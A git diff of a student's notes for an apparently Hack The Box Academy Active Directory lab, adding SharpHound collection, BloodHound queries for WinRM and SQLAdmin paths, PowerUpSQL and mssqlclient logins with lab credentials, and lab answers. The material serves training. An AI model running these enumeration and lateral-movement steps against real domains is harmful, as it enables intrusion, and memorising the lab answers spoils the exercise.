@@ -131,7 +131,7 @@ xp_cmdshell whoami /priv
 
 RDP
 ```go
-xfreerdp /v:10.129.66.204 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/ACE /smart-sizing:2400x1200 /cert:ignore
+xfreerdp /v:10.129.17.14 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/ACE /smart-sizing:2400x1200 /cert:ignore
 ```
 
 mssqlclient
@@ -151,19 +151,58 @@ evil-winrm -i 172.16.5.225 -u htb-student
 
 Answer
 ```go
-
+bdas
 ```
+
+Collect data via SharpHound and then upload to BloodHound
+```go
+.\SharpHound.exe -c All --zipfilename INLANEFREIGHT
+```
+
+Hunt for users with Remote Management Access
+```go
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+![[Pasted image 20260428062601.png]]
 
 ### Question 2: What host can this user access via WinRM? (just the computer name)
 
 Answer
 ```go
-
+ACADEMY-EA-DC01
 ```
 
-### Question 3: contents of the flag at C:\Users\damundsen\Desktop\flag.txt.
+### Question 3: Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.
 
 Answer
 ```go
 
+```
+
+Two ways to assess rights over a domain:
+
+Submitting the following query in #BloodHound
+```go
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+Or
+
+Use PowerUpSQL
+```go
+Import-Module .\PowerUpSQL.ps1
+```
+
+```go
+Get-SQLInstanceDomain
+```
+
+```go
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+```
+
+Another way to authenticate from a Linux host by using #mssqlclient 
+```go
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 ```
